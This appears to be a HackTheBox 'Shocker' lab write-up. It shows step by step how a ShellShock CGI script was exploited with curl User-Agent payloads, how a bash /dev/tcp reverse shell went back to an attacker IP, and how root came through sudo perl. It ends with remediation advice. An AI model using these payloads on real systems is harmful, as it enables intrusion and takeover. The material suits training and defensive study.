Alright! Welcome to my first writeup, ShellShock was the first vulnerability I ever exploited outside of Metasploit! So this box is super special to me. Since I'm pretty familiar with this kind of vulnerability, let's do this entire box using ONLY the command line!
<br>

# Enumeration
---

Let's begin with a simple `ping` see if our target responds to ICMP:

``` bash
┌──(kali㉿kali)-[~/htb/Shocker]
└─$ ping 10.10.10.56
PING 10.10.10.56 (10.10.10.56) 56(84) bytes of data.

64 bytes from 10.10.10.56: icmp_seq=3 ttl=63 time=32.5 ms

rtt min/avg/max/mdev = 31.864/32.323/32.616/0.328 ms
```

Nice! Let's go ahead and run `nmap` and see what ports are open:

``` bash
┌──(kali㉿kali)-[~/htb/Shocker]
└─$ nmap -p- --max-retries 1 10.10.10.56                                            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 21:35 CDT
Nmap scan report for 10.10.10.56
Host is up (0.082s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
```
I used a few *interesting* flags in that:
1. `-p-`: specifies that I want `nmap` to run against all ports (except 0...)
2. `--max-retries 1`: Caps the number of port scan probe retransmissions - meaning it'll only attempt to connect to a port 2 times, 1 for initial hit, and 1 retry. This just makes the scan run faster... However, we have the potential to still miss ports.

Okay so we found port 80 and 2222 are open, I'm going to target the webpage first (port 80). First thing's first, let's fuzz common web directories and see what we're looking at. To do this, I'll be using a new tool I found, [Feroxbuster](https://github.com/epi052/feroxbuster).

```

We found an interesting page: `/cgi-bin/user.sh`. A quick `curl` reveals the following:

``` bash
┌──(kali㉿kali)-[~/htb/Shocker]
└─$ curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

23:09:28 up  1:04,  0 users,  load average: 0.00, 0.00, 0.00
```

Good rule of thumb with `/cgi-bin/[page].sh` is to check for ShellShock. We can use the `http-shellshock.nse` script with `nmap` to test for ShellShock.

``` bash
┌──(kali㉿kali)-[~/htb/Shocker]

Well look at that, it reports vulnerable! (imagine my shock - pun 100% intended)

# Exploitation
---

Alright, let's just double-check and see if we can manually inject code.

First we'll start a netcat listener using `nc -lnvp 12345`, then we'll execute the following:

``` bash
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo BRADMAN | nc 10.10.16.192 12345'" http://10.10.10.56/cgi-bin/user.sh
```

Okay, okay, slow down, what the hell did I just do?

Let's start at `nc -lnvp 12345`, this is going to open up a **network listener** on our local machine on port 12345, meaning we are opening up that port and reporting back any connection information sent to it. We do this with the flag `-lnvp`:
1. `-l`: Listener mode for inbound connects
2. `-n`: numeric IP Addresses only, no dns
3. `-v`: verbose mode
4. `-p PORT`: the port we're wanting to open up, in this case: 12345

NetCat is pretty cool and lets us just string all these flags together as `-lnvp` or `-nvlp` or `-vlnp` or ... well... you should get the idea.

Next, we need to actually exploit ShellShock - there are super good explanations online for ShellShock, [this one is one of my favorite's.](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=5ee60f4e-030f-4691-b5b4-dc3c9e3701d4&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) I recommend reading through that if you're unfamiliar with ShellShock.

So, my actual payload in the `curl` command is<br>
`/bin/bash -c 'echo BRADMAN | nc 10.10.16.192 12345'` <br>
 What this does **echo**'s "BRADMAN" to netcat, but instead of listening, we're actually connecting to an IP Address, specifically, my attacker box, and on the port we opened, 12345. When we execute this curl command, we get the following on our netcat listener:

```bash
┌──(kali㉿kali)-[~/htb/Shocker]
└─$ nc -lnvp 12345  
listening on [any] 12345 ...
connect to [10.10.16.192] from (UNKNOWN) [10.10.10.56] 48194
BRADMAN
```

NICE! We were not only able to execute code on the target machine, but actually send a message *back* to our attacker machine! Alright, let's see if we can get a fully interactive reverse shell. We'll try to get a /dev/tcp reverse shell using the following:<br>
`bash -i >& /dev/tcp/10.10.16.192/12345 0>&1`<br>
If this works, we should expect to get a fully interactive reverse shell back on our netcat listener (we'll have to restart our netcat listener).

Exploit:
```bash
┌──(kali㉿kali)-[~/htb/Shocker]
└─$ curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.192/12345 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```

Shell:
```bash
┌──(kali㉿kali)-[~/htb/Shocker]
└─$ nc -lnvp 12345
listening on [any] 12345 ...
connect to [10.10.16.192] from (UNKNOWN) [10.10.10.56] 48196
bash: no job control in this shell

```
<br>

# Escalation
---

VERY NICE! Okay, we are now controlling the target machine as user `shelly` whomever that is... Let's look around and see if we can escalate our privileges to root.

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ 
```

 First thing I always check is what can the current user run as `sudo` but without a password. To do this, we can run `sudo -l`, if we're prompted for a password and we don't know it, then we're out of luck.... however, we're not out of luck here! We are able to run `/usr/bin/perl` as `sudo` without the need of a password. Huh, a programming language that we can run as root - I wonder whatever we'll be able to do with that? Maybe, tell it to start a new shell?

Yup! If you don't know immediately what to do, don't worry about it, let's go to [GTFOBins](https://gtfobins.github.io/) and look up perl to see if it has anything. If we search `perl` we can see that we can run a myriad of things, the one we're most interested in is `sudo`. According to GTFOBins, we can run `sudo perl -e 'exec "/bin/sh";'` and get a shell.. However, look at the results of `sudo -l` and you'll see that we need a TINY adjustment, we just need to specify the full path of perl. Easy enough:

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
sudo /usr/bin/perl -e 'exec "/bin/bash";'
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
uname -a
Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

Alright, now we're talking. We don't have a *pretty* shell but we're root! And it was pretty easy too. And there we have it, we've exploited the machine and obtained root permissions, from here we can read the `/home/shelly/user.txt` and the `/root/root.txt` and get our whole 0 points from HackTheBox!

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
sudo /usr/bin/perl -e 'exec "/bin/bash";'
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
cat /home/shelly/user.txt
13f51b<-- REDACTED -->
cat /root/root.txt  
b1fd49<-- REDACTED -->
```

# I'm vulnerable to ShellShock, how do I fix this?
---

First off, your webpage might just be vulnerable to OS Injection that happens to look like ShellShock. It's prolly vulnerable but just to be sure, double check by running the following:<br>
`env val='() { :; }; echo VULNERABLE' bash -c "echo Hello World"`

If you see `VULNERABLE` then, you guessed it...

This is a vulnerability in bash itself so to fix this, you'll have to update bash.

Update with apt:<br>
`sudo apt-get update && sudo apt-get install --only-upgrade bash`

Update with yum:<br>
`sudo yum update bash`

Good rule of thumb is to always stay up-to-date on patches!
